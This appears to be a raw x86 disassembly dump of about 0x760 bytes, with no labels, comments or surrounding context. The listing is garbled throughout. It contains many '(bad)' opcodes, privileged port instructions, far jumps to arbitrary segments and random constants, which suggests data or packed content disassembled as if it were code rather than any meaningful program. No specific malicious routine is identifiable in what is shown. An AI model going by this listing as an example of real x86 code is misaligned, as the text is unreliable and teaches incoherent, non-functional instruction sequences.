  40c72b:	(bad)  
  40c72d:	inc    ebp
  40c72e:	repnz mov ch,0x48
  40c731:	cld    
  40c732:	mov    ah,BYTE PTR [ebp+0x4c]
  40c735:	mov    dl,0xa1
  40c737:	in     al,0xc6
  40c739:	lea    edi,ds:0x6e075de3
  40c73f:	es clc 
  40c741:	jle    0x40c6e5
  40c743:	retf   0x5fef
  40c746:	(bad)  
  40c747:	or     ebp,0xb483e28f
  40c74d:	pusha  
  40c74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c74f:	dec    eax
  40c750:	push   0xcaea349c
  40c755:	repnz shl BYTE PTR [edi+0x6526a741],0xf6
  40c75d:	xor    al,0xd6
  40c75f:	jp     0x40c7bf
  40c761:	fcomip st,st(1)
  40c763:	mov    al,0xc2
  40c765:	sub    ebp,DWORD PTR [esi]
  40c767:	fs pop ss
  40c769:	mov    edi,gs
  40c76b:	(bad)  [ecx-0x314f2a4]
  40c771:	jne    0x40c7b6
  40c773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c774:	lds    ebp,FWORD PTR [eax]
  40c776:	xor    DWORD PTR [eax+0x2b7fead6],eax
  40c77c:	sti    
  40c77d:	inc    ebp
  40c77e:	adc    eax,0x93664dc1
  40c783:	pop    ecx
  40c784:	and    bh,BYTE PTR [ebp+ecx*2+0x21698e71]
  40c78b:	imul   edx
  40c78d:	jge    0x40c754
  40c78f:	mov    WORD PTR [ebx+0x47f75b75],fs
  40c795:	test   DWORD PTR [ebx-0x5f],ebx
  40c798:	pop    edx
  40c799:	jb     0x40c7d0
  40c79b:	sti    
  40c79c:	stc    
  40c79d:	xor    eax,0x66bcc20b
  40c7a2:	call   0x60331e0d
  40c7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7a8:	pop    ecx
  40c7a9:	mov    cl,0xe6
  40c7ab:	aam    0xcf
  40c7ad:	push   0xffffffc3
  40c7af:	adc    ebp,DWORD PTR [eax+0x29d9f2c7]
  40c7b5:	xchg   edx,eax
  40c7b6:	lahf   
  40c7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b8:	cmp    bl,BYTE PTR [edx-0x30f4ce98]
  40c7be:	inc    edi
  40c7bf:	popa   
  40c7c0:	jo     0x40c7b2
  40c7c2:	retf   
  40c7c3:	sbb    cl,BYTE PTR [esi]
  40c7c5:	test   al,0x74
  40c7c7:	xchg   BYTE PTR [ecx+0x75],bh
  40c7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7cb:	cwde   
  40c7cc:	pop    edi
  40c7cd:	shl    DWORD PTR [edi-0x13],cl
  40c7d0:	push   edi
  40c7d1:	mov    al,0xe2
  40c7d3:	imul   esp,DWORD PTR [ebp+0x75],0xffffffb5
  40c7d7:	out    0x73,eax
  40c7d9:	xchg   edx,eax
  40c7da:	mov    ah,0xc3
  40c7dc:	add    ch,BYTE PTR [edi-0x4cdb09c5]
  40c7e2:	jae    0x40c80f
  40c7e4:	xor    esi,DWORD PTR [edi+0x67]
  40c7e7:	call   0xcc11a813
  40c7ec:	fs pop ss
  40c7ee:	push   cs
  40c7ef:	xlat   BYTE PTR ds:[ebx]
  40c7f0:	clc    
  40c7f1:	dec    ecx
  40c7f2:	clc    
  40c7f3:	adc    BYTE PTR [ebx],dh
  40c7f5:	pop    edx
  40c7f6:	adc    BYTE PTR [edx+eiz*2-0x4cb9faa7],ah
  40c7fd:	rcr    DWORD PTR [ecx+0x44939d9d],0xa0
  40c804:	sub    eax,0x773691d8
  40c809:	mul    BYTE PTR [edi+ebp*1+0x4e]
  40c80d:	add    ebx,DWORD PTR [edi-0x16]
  40c810:	xchg   esp,eax
  40c811:	sbb    al,dl
  40c813:	mov    al,ds:0xa65aaa06
  40c818:	sub    al,0x7
  40c81a:	cdq    
  40c81b:	pop    edi
  40c81c:	adc    DWORD PTR [esi+0x58],eax
  40c81f:	xor    BYTE PTR [esp+ebp*1-0x5842073d],dh
  40c826:	jmp    0x233f4856
  40c82b:	pop    ebp
  40c82c:	pop    es
  40c82d:	jl     0x40c85f
  40c82f:	daa    
  40c830:	adc    al,BYTE PTR [ecx+eiz*1+0xc97070]
  40c837:	dec    esp
  40c838:	adc    DWORD PTR [eax+edi*4+0x400c082b],esi
  40c83f:	xor    dh,BYTE PTR [esi*4+0x72468870]
  40c846:	pusha  
  40c847:	mov    ds:0x6d32141d,al
  40c84c:	cdq    
  40c84d:	dec    ebp
  40c84e:	(bad)  
  40c84f:	push   ss
  40c850:	cwde   
  40c851:	enter  0x7c2c,0x91
  40c855:	mov    dh,0x53
  40c857:	sub    BYTE PTR [edx+ecx*2],0xd3
  40c85b:	push   edi
  40c85c:	cmp    eax,0xb10c58d1
  40c861:	dec    esi
  40c862:	psubusw mm2,QWORD PTR [ecx+esi*4+0x2d92d045]
  40c86a:	push   ss
  40c86b:	out    0xd1,al
  40c86d:	add    DWORD PTR [esi-0x3bfe796],esi
  40c873:	jno    0x40c805
  40c875:	out    dx,al
  40c876:	inc    esi
  40c877:	sub    BYTE PTR [ebx+0x75],dh
  40c87a:	test   BYTE PTR [ecx+0x299d6450],dl
  40c880:	int3   
  40c881:	jmp    0x7a191232
  40c886:	push   esi
  40c887:	and    ecx,edx
  40c889:	cmp    esi,DWORD PTR [eax]
  40c88b:	dec    DWORD PTR [ebx-0x2e]
  40c88e:	mov    al,ds:0xbc09b029
  40c893:	push   0xfffffff2
  40c895:	or     DWORD PTR [edx+0x54fab716],esi
  40c89b:	fisubr DWORD PTR es:[bx-0x6fae]
  40c8a1:	dec    ecx
  40c8a2:	sub    esi,DWORD PTR [ecx+0x29]
  40c8a5:	mov    ebp,0xf0d28562
  40c8aa:	test   al,0x66
  40c8ac:	mov    esp,0x4d0c4bae
  40c8b1:	scas   al,BYTE PTR es:[edi]
  40c8b2:	aam    0xf7
  40c8b4:	stc    
  40c8b5:	inc    ecx
  40c8b6:	les    eax,FWORD PTR [ecx]
  40c8b8:	xchg   ebp,eax
  40c8b9:	xor    al,0x61
  40c8bb:	aas    
  40c8bc:	dec    esp
  40c8bd:	mov    esi,0x7a6901e
  40c8c2:	das    
  40c8c3:	or     BYTE PTR [edx+ebx*2],0x47
  40c8c7:	and    bl,dh
  40c8c9:	outs   dx,DWORD PTR ds:[esi]
  40c8ca:	adc    edx,edx
  40c8cc:	cmp    edx,eax
  40c8ce:	iret   
  40c8cf:	adc    BYTE PTR [edi+0x7e],al
  40c8d2:	push   ebx
  40c8d3:	mov    ebp,0x3c18e7e6
  40c8d8:	push   esi
  40c8d9:	mov    ah,BYTE PTR [ecx-0x3a]
  40c8dc:	xchg   BYTE PTR [esp+edx*1+0x57c0aa7],ch
  40c8e3:	test   eax,0xaa5a3f58
  40c8e8:	cmp    DWORD PTR [ebp-0x54],0xffffffad
  40c8ec:	mov    edx,0xbe4f601c
  40c8f1:	inc    esp
  40c8f2:	and    BYTE PTR [ecx+0x23],0x0
  40c8f6:	mov    ds:0x1e396f9d,eax
  40c8fb:	jecxz  0x40c925
  40c8fd:	jo     0x40c8df
  40c8ff:	add    al,0xa2
  40c901:	inc    esp
  40c902:	and    BYTE PTR [ebx],bh
  40c904:	mov    edi,fs
  40c906:	or     esi,0x17
  40c909:	lock leave 
  40c90b:	cld    
  40c90c:	jns    0x40c908
  40c90e:	inc    eax
  40c90f:	das    
  40c910:	mov    edx,DWORD PTR [ebx+0x1f]
  40c913:	jg     0x40c8e0
  40c915:	jns    0x40c8f1
  40c917:	icebp  
  40c918:	xchg   esp,eax
  40c919:	push   ebp
  40c91a:	popf   
  40c91b:	xchg   edi,eax
  40c91c:	fmul   st,st(3)
  40c91e:	test   ebp,eax
  40c920:	xor    ch,BYTE PTR [ebx+0x4d707101]
  40c926:	or     al,0xab
  40c928:	jp     0x40c92b
  40c92a:	jmp    0xa5dc:0x32a9e0b0
  40c931:	mov    eax,0xc9349e20
  40c936:	call   0xcce6c8e6
  40c93b:	scas   al,BYTE PTR es:[edi]
  40c93c:	adc    DWORD PTR [eax],ebp
  40c93e:	rcr    esi,cl
  40c940:	pop    eax
  40c941:	arpl   WORD PTR [ecx+0x3b7fff7d],dx
  40c947:	ja     0x40c98c
  40c949:	cmp    al,0xba
  40c94b:	loope  0x40c911
  40c94d:	cdq    
  40c94e:	shl    BYTE PTR [ecx-0x27],1
  40c951:	and    BYTE PTR [eax+0x28],0xe0
  40c955:	rcl    BYTE PTR [edx-0x51],1
  40c958:	or     ebx,DWORD PTR [edi+0x1067e497]
  40c95e:	pop    eax
  40c95f:	xor    DWORD PTR [esi],ebx
  40c961:	pusha  
  40c962:	test   BYTE PTR [ebx+0x26710df3],dh
  40c968:	int3   
  40c969:	push   es
  40c96a:	push   ss
  40c96b:	mov    edx,0x725a5d90
  40c970:	xchg   edx,eax
  40c971:	mov    esi,0x3e651925
  40c976:	jns    0x40c8f8
  40c978:	shl    BYTE PTR [esi+0x29],1
  40c97b:	fs mov al,0xa6
  40c97e:	into   
  40c97f:	push   ecx
  40c980:	inc    edx
  40c981:	add    al,0x80
  40c983:	les    esp,FWORD PTR [esi-0x46a86f98]
  40c989:	push   0xffffff8f
  40c98b:	stc    
  40c98c:	fs push esp
  40c98e:	cmp    DWORD PTR [eax-0x604e97b],esp
  40c994:	xor    dl,0x6a
  40c997:	fs pop esi
  40c999:	in     al,0x45
  40c99b:	push   edx
  40c99c:	div    cl
  40c99e:	xor    BYTE PTR [eax],dh
  40c9a0:	or     DWORD PTR [ebp-0x65],ecx
  40c9a3:	hlt    
  40c9a4:	mov    ch,0xd6
  40c9a6:	rol    DWORD PTR [esi+0x70cfd636],cl
  40c9ac:	add    eax,ebp
  40c9ae:	pop    ss
  40c9af:	out    0x27,al
  40c9b1:	push   esp
  40c9b2:	mov    esp,0x6e4cc232
  40c9b7:	jnp    0x40c963
  40c9b9:	icebp  
  40c9ba:	pusha  
  40c9bb:	ret    0xd49b
  40c9be:	test   dl,cl
  40c9c0:	jns    0x40c967
  40c9c2:	loop   0x40c953
  40c9c4:	ds cld 
  40c9c6:	pop    eax
  40c9c7:	cmp    eax,0x647d7f04
  40c9cc:	in     al,0x3
  40c9ce:	mov    DWORD PTR [ebp+0x1c65ad9c],esi
  40c9d4:	cld    
  40c9d5:	(bad)  
  40c9d6:	js     0x40ca53
  40c9d8:	dec    esi
  40c9d9:	pop    ss
  40c9da:	pop    ecx
  40c9db:	sbb    al,0xe5
  40c9dd:	jo     0x40c99b
  40c9df:	in     al,dx
  40c9e0:	push   edx
  40c9e1:	std    
  40c9e2:	rcr    ecx,0x8f
  40c9e5:	test   DWORD PTR [eax+0x28],0x2785e89d
  40c9ec:	stos   BYTE PTR es:[edi],al
  40c9ed:	rol    DWORD PTR [eax],1
  40c9ef:	mov    al,bh
  40c9f1:	lea    ecx,[esi+esi*8]
  40c9f4:	mov    ch,0x67
  40c9f6:	mov    edx,0xd621644f
  40c9fb:	(bad)  
  40c9fd:	push   ecx
  40c9fe:	es push ebp
  40ca00:	mov    ds:0xf5978300,eax
  40ca05:	and    BYTE PTR [eax+0x2617ed77],0x89
  40ca0c:	in     eax,0x13
  40ca0e:	retf   
  40ca0f:	adc    cl,dh
  40ca11:	fisttp WORD PTR [esp+edx*4+0x67]
  40ca15:	adc    eax,0x9a2e2ec8
  40ca1a:	push   esi
  40ca1b:	jmp    0xf98e:0x52f840ea
  40ca22:	cmp    DWORD PTR [edx-0x1bc29489],esp
  40ca28:	fnclex 
  40ca2a:	in     eax,0xba
  40ca2c:	lea    esi,[ebx]
  40ca2e:	inc    ebp
  40ca2f:	aam    0x62
  40ca31:	mov    ds:0x176a4229,eax
  40ca36:	cs daa 
  40ca38:	imul   ebx,DWORD PTR [edi],0xffffffd9
  40ca3b:	sub    eax,0xf54220c5
  40ca40:	sub    al,0x94
  40ca42:	rcr    dl,cl
  40ca44:	pop    edi
  40ca45:	sti    
  40ca46:	jne    0x40cabc
  40ca48:	push   ebp
  40ca49:	loope  0x40ca66
  40ca4b:	fstp   DWORD PTR [eax-0x300e7851]
  40ca51:	jo     0x40caa4
  40ca53:	popf   
  40ca54:	jmp    0x7713:0x2851b9fd
  40ca5b:	ret    0x9daf
  40ca5e:	adc    ecx,DWORD PTR [ebp-0x31]
  40ca61:	dec    esi
  40ca62:	fisub  WORD PTR [ebp-0x76c609e2]
  40ca68:	xchg   BYTE PTR [edi],bh
  40ca6a:	mov    cs,WORD PTR [ebp+ecx*1+0x1e]
  40ca6e:	mov    ds:0x48f68f8,al
  40ca73:	leave  
  40ca74:	in     al,0x52
  40ca76:	pop    edx
  40ca77:	jmp    0x40ca14
  40ca79:	xchg   edx,eax
  40ca7a:	les    ecx,FWORD PTR [esi-0x54a1a25c]
  40ca80:	sub    bh,BYTE PTR [ecx+0x6c0c20f4]
  40ca86:	test   DWORD PTR [ecx],ecx
  40ca88:	cmp    BYTE PTR [edx],ch
  40ca8a:	jl     0x40ca48
  40ca8c:	xchg   ecx,eax
  40ca8d:	xor    esp,edx
  40ca8f:	sbb    ecx,DWORD PTR [edi-0x40]
  40ca92:	retf   
  40ca93:	and    eax,esp
  40ca95:	mov    ah,0xc7
  40ca97:	outs   dx,DWORD PTR ds:[esi]
  40ca98:	add    al,0x73
  40ca9a:	test   DWORD PTR [ecx-0x48fa4444],ebx
  40caa0:	sbb    ecx,DWORD PTR [esi+0x76]
  40caa3:	ins    DWORD PTR es:[edi],dx
  40caa4:	mov    eax,ds:0xd63a7767
  40caa9:	sbb    eax,0x8c8a311b
  40caae:	hlt    
  40caaf:	(bad)
  40cab4:	cwde   
  40cab5:	cmp    DWORD PTR [edi],esp
  40cab7:	fld    st(2)
  40cab9:	push   esi
  40caba:	and    dl,BYTE PTR [ecx]
  40cabc:	loope  0x40cb0a
  40cabe:	inc    ebx
  40cabf:	dec    ebx
  40cac0:	inc    ecx
  40cac1:	fwait
  40cac2:	mov    ecx,0x9957b4ed
  40cac7:	stc    
  40cac8:	in     eax,dx
  40cac9:	push   ecx
  40caca:	outs   dx,DWORD PTR ds:[esi]
  40cacb:	imul   dl
  40cacd:	cmp    BYTE PTR [eax+edx*2-0x5ec62f22],bh
  40cad4:	cwde   
  40cad5:	fnstenv [esi]
  40cad7:	aam    0xbb
  40cad9:	das    
  40cada:	scas   al,BYTE PTR es:[edi]
  40cadb:	ins    BYTE PTR es:[edi],dx
  40cadc:	das    
  40cadd:	inc    eax
  40cade:	add    ebx,DWORD PTR [esi+0x5e]
  40cae1:	jbe    0x40cacf
  40cae3:	cmp    bl,BYTE PTR [ebx+0x1eafbcee]
  40cae9:	pop    ebx
  40caea:	and    eax,0x605e9ec1
  40caef:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40caf1:	arpl   WORD PTR [ecx+0x7782a567],bp
  40caf7:	push   esi
  40caf8:	fwait
  40caf9:	nop
  40cafa:	push   ebp
  40cafb:	shl    DWORD PTR [ebx],0x38
  40cafe:	les    ecx,FWORD PTR [ebx]
  40cb00:	mov    bh,0x55
  40cb02:	add    al,0x3
  40cb04:	and    DWORD PTR [edi-0x15],ebp
  40cb07:	dec    esp
  40cb08:	pop    DWORD PTR [edx]
  40cb0a:	push   ebx
  40cb0b:	add    DWORD PTR [esi],eax
  40cb0d:	test   BYTE PTR ds:0xdd8b58f,al
  40cb13:	push   esp
  40cb14:	mov    es,WORD PTR [ecx]
  40cb16:	sub    eax,0xe0feb829
  40cb1b:	dec    ebp
  40cb1c:	fwait
  40cb1d:	enter  0x4a6c,0xa8
  40cb21:	xchg   ecx,eax
  40cb22:	jmp    0x2841:0xcaa1de9f
  40cb29:	cwde   
  40cb2a:	sti    
  40cb2b:	adc    eax,0x7123155c
  40cb30:	int    0xb1
  40cb32:	mov    ds:0xcb6e4c5f,eax
  40cb37:	dec    edi
  40cb38:	xor    esp,ebp
  40cb3a:	or     eax,0x9f9bcf34
  40cb3f:	mov    DWORD PTR [ecx-0x1],edx
  40cb42:	pop    edx
  40cb43:	stos   BYTE PTR es:[edi],al
  40cb44:	xor    eax,0xd0bc9d34
  40cb49:	add    al,0x5c
  40cb4b:	popf   
  40cb4c:	mov    al,ds:0x43b45f4c
  40cb51:	and    DWORD PTR [edx+0x4daa54f0],0xa154377d
  40cb5b:	lods   al,BYTE PTR ds:[esi]
  40cb5c:	test   al,0x20
  40cb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb5f:	cmp    cl,dl
  40cb61:	in     eax,0x6c
  40cb63:	pop    es
  40cb64:	pop    ss
  40cb65:	jl     0x40cb67
  40cb67:	sti    
  40cb68:	mov    esi,0xfb1d122b
  40cb6d:	addr16 push es
  40cb6f:	jbe    0x40cbce
  40cb71:	daa    
  40cb72:	jge    0x40cb81
  40cb74:	gs pop ds
  40cb76:	jecxz  0x40cbae
  40cb78:	pop    es
  40cb79:	hlt    
  40cb7a:	mov    dl,0xdf
  40cb7c:	int3   
  40cb7d:	fwait
  40cb7e:	xor    esi,DWORD PTR [ecx]
  40cb80:	loope  0x40cba1
  40cb82:	sbb    al,0xeb
  40cb84:	fadd   QWORD PTR [edi-0x59195866]
  40cb8a:	push   edx
  40cb8b:	loop   0x40cb74
  40cb8d:	sti    
  40cb8e:	das    
  40cb8f:	sti    
  40cb90:	mov    al,ds:0xb0c7fe6c
  40cb95:	push   ebp
  40cb96:	js     0x40cc05
  40cb98:	jae    0x40cbf3
  40cb9a:	jecxz  0x40cc09
  40cb9c:	stc    
  40cb9d:	adc    al,0x3
  40cb9f:	mov    esi,edx
  40cba1:	clc    
  40cba2:	repnz out 0xf2,al
  40cba5:	mov    al,ds:0x2231d531
  40cbaa:	rcl    BYTE PTR [eax-0x63],0x10
  40cbae:	mov    ds:0x38c2e10e,al
  40cbb3:	cmp    BYTE PTR [ecx-0x26f47508],al
  40cbb9:	dec    ebx
  40cbba:	xchg   BYTE PTR [edi+0x225a757a],ch
  40cbc0:	cwde   
  40cbc1:	jb     0x40cbdd
  40cbc3:	adc    BYTE PTR [ecx+0x29],dh
  40cbc6:	xlat   BYTE PTR ds:[ebx]
  40cbc7:	sbb    al,0x7e
  40cbc9:	or     bh,ch
  40cbcb:	(bad)  
  40cbcc:	mov    ecx,0xdabe847
  40cbd1:	test   eax,0xe3f37072
  40cbd6:	ins    DWORD PTR es:[edi],dx
  40cbd7:	or     ebp,eax
  40cbd9:	mov    esp,ebx
  40cbdb:	inc    ebp
  40cbdc:	gs and eax,0xf4a0a9ce
  40cbe2:	retf   
  40cbe3:	jae    0x40cba6
  40cbe5:	sbb    al,0xb4
  40cbe7:	cli    
  40cbe8:	pop    edi
  40cbe9:	dec    edi
  40cbea:	(bad)  
  40cbeb:	daa    
  40cbec:	aad    0xc2
  40cbee:	mov    eax,0x854be72d
  40cbf3:	es (bad) 
  40cbf5:	(bad)  
  40cbf6:	fsubr  QWORD PTR [eax+ecx*4]
  40cbf9:	out    0xe5,al
  40cbfb:	jl     0x40cc63
  40cbfd:	xchg   edi,eax
  40cbfe:	push   eax
  40cbff:	je     0x40cb83
  40cc01:	pusha  
  40cc02:	inc    eax
  40cc03:	sub    al,0x8
  40cc05:	iret   
  40cc06:	push   ebp
  40cc07:	ret    0x62a8
  40cc0a:	fwait
  40cc0b:	pop    ebp
  40cc0c:	clc    
  40cc0d:	loopne 0x40cbb7
  40cc0f:	das    
  40cc10:	add    al,BYTE PTR [edi+0x73]
  40cc13:	push   ebp
  40cc14:	ss clc 
  40cc16:	xchg   ebp,edx
  40cc18:	cmp    eax,0xa0982fda
  40cc1d:	cli    
  40cc1e:	sub    DWORD PTR [ebx+0x4a],ebx
  40cc21:	dec    edx
  40cc22:	(bad)  
  40cc23:	and    dh,BYTE PTR [edi-0x7c61665]
  40cc29:	gs stc 
  40cc2b:	xlat   BYTE PTR ds:[ebx]
  40cc2c:	addr16 jne 0x40cca5
  40cc2f:	pop    ebx
  40cc30:	iret   
  40cc31:	data16 aaa 
  40cc33:	xlat   BYTE PTR ds:[ebx]
  40cc34:	jne    0x40cc8b
  40cc36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc37:	pop    ebp
  40cc38:	scas   al,BYTE PTR es:[edi]
  40cc39:	loop   0x40cbc2
  40cc3b:	sbb    eax,0x16d99a8d
  40cc40:	mov    esi,0x42227967
  40cc45:	hlt    
  40cc46:	sahf   
  40cc47:	rcl    BYTE PTR [edx+0x32],1
  40cc4a:	and    bh,BYTE PTR [ebx]
  40cc4c:	dec    esi
  40cc4d:	sbb    esp,DWORD PTR [edi-0x7287204d]
  40cc53:	jmp    FWORD PTR [ebx+0x1b]
  40cc56:	stc    
  40cc57:	jle    0x40ccb4
  40cc59:	in     eax,dx
  40cc5a:	push   edx
  40cc5b:	stos   BYTE PTR es:[edi],al
  40cc5c:	je     0x40ccc8
  40cc5e:	test   BYTE PTR [edx],bh
  40cc60:	(bad)  
  40cc61:	xchg   esp,eax
  40cc62:	xor    ebx,edi
  40cc64:	pop    esi
  40cc65:	mov    al,0xa1
  40cc67:	mov    al,ds:0xc38c4d92
  40cc6c:	in     al,0x4d
  40cc6e:	xchg   esi,eax
  40cc6f:	add    BYTE PTR [eax],bl
  40cc71:	inc    ebp
  40cc72:	scas   al,BYTE PTR es:[edi]
  40cc73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc74:	xchg   ecx,eax
  40cc75:	mov    edi,0x5b221ee6
  40cc7a:	imul   esi,DWORD PTR [ebx],0x1fabf7f9
  40cc80:	sbb    al,0xe1
  40cc82:	aaa    
  40cc83:	sbb    al,BYTE PTR [ecx+0x64a0b02a]
  40cc89:	int    0xf
  40cc8b:	pop    ebp
  40cc8c:	push   0xf31fa60a
  40cc91:	mov    bh,0xf8
  40cc93:	xlat   BYTE PTR ds:[ebx]
  40cc94:	mov    ebx,DWORD PTR [eax-0x1a]
  40cc97:	gs dec edi
  40cc99:	pop    ds
  40cc9a:	popf   
  40cc9b:	xor    BYTE PTR [edi+ecx*4+0x65b8393f],bh
  40cca2:	test   BYTE PTR [edi-0x1c],dh
  40cca5:	call   0xf24d:0xd26cdd02
  40ccac:	loopne 0x40ccdc
  40ccae:	xor    eax,0x9a41e51e
  40ccb3:	mov    al,ds:0xebb38ec2
  40ccb8:	fistp  WORD PTR [esi]
  40ccba:	or     eax,0x2379b906
  40ccbf:	push   esp
  40ccc0:	mov    bl,0xdd
  40ccc3:	mov    edx,0xc4ee3343
  40ccc8:	lea    edi,[ebp+0x15]
  40cccb:	dec    edx
  40cccc:	and    BYTE PTR [eax+0x7592df72],bh
  40ccd2:	leave  
  40ccd3:	data16 clc 
  40ccd5:	dec    eax
  40ccd6:	stos   BYTE PTR es:[edi],al
  40ccd7:	dec    BYTE PTR [ebx]
  40ccd9:	sub    eax,edx
  40ccdb:	and    ecx,DWORD PTR [esi-0x2]
  40ccde:	inc    edi
  40ccdf:	xchg   ebp,eax
  40cce0:	sub    al,BYTE PTR [eax]
  40cce2:	sub    BYTE PTR [ecx+0x11483196],al
  40cce8:	repz int 0xdd
  40cceb:	pushf  
  40ccec:	xchg   ebp,eax
  40cced:	fimul  WORD PTR [ecx-0x54]
  40ccf0:	cld    
  40ccf1:	xchg   ecx,eax
  40ccf2:	dec    ebx
  40ccf3:	(bad)  [eax+0x2cc083c2]
  40ccf9:	jecxz  0x40ccfe
  40ccfb:	loop   0x40cd78
  40ccfd:	popf   
  40ccfe:	sbb    al,0x52
  40cd00:	ret    
  40cd01:	lahf   
  40cd02:	and    al,0xe5
  40cd04:	jl     0x40ccc5
  40cd06:	xor    BYTE PTR [ebx],bh
  40cd08:	add    bh,dh
  40cd0a:	lahf   
  40cd0b:	ds push ebx
  40cd0d:	or     eax,DWORD PTR [esi+edx*8+0x31ae62e6]
  40cd14:	xchg   BYTE PTR [ebx],dl
  40cd16:	mov    eax,ds:0x7a5520aa
  40cd1b:	test   BYTE PTR [ebx+edx*1],0xba
  40cd1f:	jae    0x40cd3b
  40cd21:	inc    edx
  40cd22:	push   0xbe76e421
  40cd27:	icebp  
  40cd28:	push   esi
  40cd29:	iret   
  40cd2a:	cmp    DWORD PTR [ebp-0x43ee0107],ebp
  40cd30:	repnz lods eax,DWORD PTR ds:[esi]
  40cd32:	jmp    0x40cd99
  40cd34:	inc    eax
  40cd35:	adc    ch,0xdc
  40cd38:	push   edx
  40cd39:	xlat   BYTE PTR ds:[ebx]
  40cd3a:	out    dx,al
  40cd3b:	mov    edx,0xdc634e79
  40cd40:	fcomip st,st(6)
  40cd42:	and    esp,DWORD PTR [edx]
  40cd44:	push   eax
  40cd45:	es sti 
  40cd47:	ds inc ebx
  40cd49:	or     bl,al
  40cd4b:	daa    
  40cd4c:	adc    DWORD PTR [ecx+0x2f],esi
  40cd4f:	adc    al,0x27
  40cd51:	in     eax,dx
  40cd52:	loope  0x40cd7f
  40cd54:	fidiv  WORD PTR [ebp+0x5f6015ca]
  40cd5a:	jmp    0x40cd8e
  40cd5c:	add    eax,0x6950822b
  40cd61:	fadd   DWORD PTR [ecx-0x482f74ef]
  40cd67:	adc    ebp,DWORD PTR [ecx]
  40cd69:	and    eax,0x2b65b952
  40cd6e:	mov    esi,0xb23dff1b
  40cd73:	call   0xaeae:0xdc5944d4
  40cd7a:	cwde   
  40cd7b:	mov    dh,0x84
  40cd7d:	push   ebp
  40cd7e:	imul   esp,DWORD PTR [edi-0x117c48e4],0x715febc2
  40cd88:	dec    ecx
  40cd89:	lods   al,BYTE PTR ds:[esi]
  40cd8a:	aas    
  40cd8b:	std    
  40cd8c:	repz and al,ch
  40cd8f:	inc    esp
  40cd90:	sbb    eax,0xdb5c712d
  40cd95:	hlt    
  40cd96:	mov    esi,0x43eff5b0
  40cd9b:	pop    ds
  40cd9c:	cdq    
  40cd9d:	and    al,0x92
  40cd9f:	jl     0x40cde8
  40cda1:	pop    ss
  40cda2:	ins    DWORD PTR es:[edi],dx
  40cda3:	loop   0x40ce20
  40cda5:	add    eax,0xc07e05e6
  40cdaa:	fs xchg ecx,eax
  40cdac:	nop
  40cdad:	mov    edi,0xc6e730ca
  40cdb2:	mov    DWORD PTR [edx-0x393dbe34],ebp
  40cdb8:	clc    
  40cdb9:	fidiv  WORD PTR [ebp+edx*4-0x163b0174]
  40cdc0:	out    0xcc,al
  40cdc2:	xchg   esp,eax
  40cdc3:	pop    eax
  40cdc4:	pop    ss
  40cdc5:	fsub   st(3),st
  40cdc7:	ret    0x8f11
  40cdca:	push   0x6c
  40cdcc:	sub    ecx,DWORD PTR [esi-0xf]
  40cdcf:	xor    dl,BYTE PTR [ebx+0x792d71cd]
  40cdd5:	repnz lds ebx,FWORD PTR [ebp-0x61]
  40cdd9:	mov    WORD PTR [esi-0x2f62e5e0],?
  40cddf:	pushf  
  40cde0:	inc    esi
  40cde1:	jo     0x40ce01
  40cde3:	push   ds
  40cde4:	pop    esi
  40cde5:	or     DWORD PTR [edi-0x7e],edi
  40cde8:	sar    WORD PTR [edx],cl
  40cdeb:	sbb    DWORD PTR fs:[ebp+eax*1-0x625504e2],ebx
  40cdf3:	test   BYTE PTR [ebx-0x26],0xdf
  40cdf7:	sbb    DWORD PTR [edx-0x2a],ecx
  40cdfa:	inc    ebp
  40cdfb:	(bad)  
  40cdfc:	std    
  40cdfd:	mov    dl,0xf2
  40cdff:	addr16 sbb al,0x67
  40ce02:	push   edi
  40ce03:	jne    0x40ce69
  40ce05:	xchg   ebp,eax
  40ce06:	or     ebx,DWORD PTR [ebp-0x7fa2aa08]
  40ce0c:	pop    ebp
  40ce0d:	or     ah,BYTE PTR [eax]
  40ce0f:	retf   0xef2d
  40ce12:	out    0x3f,al
  40ce14:	sti    
  40ce15:	mov    dl,0x37
  40ce17:	lea    ecx,[edx]
  40ce19:	mov    WORD PTR [ecx-0x7d8e7a3d],?
  40ce1f:	mov    esi,0x18b64d7f
  40ce24:	jmp    0xdd4792ea
  40ce29:	outs   dx,BYTE PTR ds:[esi]
  40ce2a:	and    al,0xbf
  40ce2c:	arpl   WORD PTR [ebp-0x53],bx
  40ce2f:	mov    dh,0x72
  40ce31:	sub    BYTE PTR [ebp+esi*4-0x3c],bh
  40ce35:	cmp    ebx,DWORD PTR [ecx]
  40ce37:	scas   al,BYTE PTR es:[edi]
  40ce38:	cli    
  40ce39:	jns    0x40ce3b
  40ce3b:	sbb    esp,DWORD PTR [ecx-0x7df68af6]
  40ce41:	mov    BYTE PTR [ebx+ebx*2-0x69e8cf8f],al
  40ce48:	(bad)  
  40ce49:	js     0x40ce9d
  40ce4b:	mov    ds,WORD PTR [edx+0x7e]
  40ce4e:	mov    ch,0x6
  40ce50:	add    DWORD PTR [ebx+edx*4],edx
  40ce53:	xor    eax,0xd782700a
  40ce58:	test   DWORD PTR [esi+0x3a5a0727],0xf2837d4
  40ce62:	(bad)  
  40ce63:	in     al,0xcc
  40ce65:	xchg   si,ax
  40ce67:	stos   DWORD PTR es:[edi],eax
  40ce68:	mov    bh,0x6
  40ce6a:	test   BYTE PTR [esi+0x2e],0xb9
  40ce6e:	push   ecx
  40ce6f:	int    0x6c
  40ce71:	stc    
  40ce72:	xchg   DWORD PTR [edi+0x2],edx
  40ce75:	ins    BYTE PTR es:[edi],dx
  40ce76:	pop    ecx
  40ce77:	push   ds
  40ce78:	pop    edi
  40ce79:	xchg   ebx,eax
  40ce7a:	adc    BYTE PTR [ecx-0x6e],ch
  40ce7d:	fisub  WORD PTR [ebx]
  40ce7f:	clc    
  40ce80:	adc    edx,edi
  40ce82:	(bad)  
  40ce83:	out    dx,eax
  40ce84:	fwait
  40ce85:	mov    ebx,ecx
  40ce87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce88:	sahf   
